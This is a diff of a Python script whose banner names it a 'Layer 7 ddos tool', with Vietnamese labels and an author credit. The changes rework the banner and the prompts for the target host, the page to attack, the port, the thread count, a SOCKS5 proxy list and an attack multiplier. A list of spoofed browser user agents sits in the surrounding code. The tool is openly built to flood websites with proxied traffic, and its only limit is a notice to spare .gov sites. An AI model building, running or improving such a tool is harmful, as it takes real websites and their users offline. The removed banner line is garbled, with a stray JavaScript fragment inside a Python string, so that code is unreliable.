@@ -9,8 +9,12 @@ import threading
 import sys
 
 print ('''
-
-╠═╣\x20║\x20\x20║\x20╠═╣║\x20\x20╠╩╗\x20\x20║╣\x20║║║\x20║║'),console['log']('╩\x20╩\x20╩\x20\x20╩\x20╩\x20╩╚═╝╩\x20╩\x20\x20╚═╝╝╚╝═╩╝
+	   /////    /////    /////////////
+	  CCCCC/   CCCCC/   | HVT-CC    |/
+	 CC/      CC/       |-----------|/ 
+	 CC/      CC/       |  Layer 7  |/ 
+	 CC/////  CC/////   | ddos tool |/ 
+	  CCCCC/   CCCCC/   |___________|/
                             Code by Thành Trung
 ┌─────────────────────────────────────────────┐
 │        Lưu ý: Không Tấn Công Website .gov   │
@@ -142,10 +146,10 @@ useragents=["Mozilla/5.0 (Android; Linux armv7l; rv:10.0.1) Gecko/20100101 Firef
 			"Mozilla/5.0 (X11; U; SunOS sun4m; en-US; rv:1.4b) Gecko/20030517 Mozilla Firebird/0.6",]
 
 ip = str(input("> Host/Ip:"))
-url = str(input("> Page you want to attack:"))
+url = str(input("> Nhập Web DDoS:"))
 port = int(input("> Port:"))
 thread_num = int(input("> Threads:"))
-out_file = str(input("> Proxy file path(proxy.txt):"))
+out_file = str(input("> Proxy file path(socks5_proxies.txt):"))
 print ("> Number Of Proxies: %s" %(len(open(out_file).readlines())))
 time.sleep(0.3)
 multiple = int(input("> Input the Magnification:"))
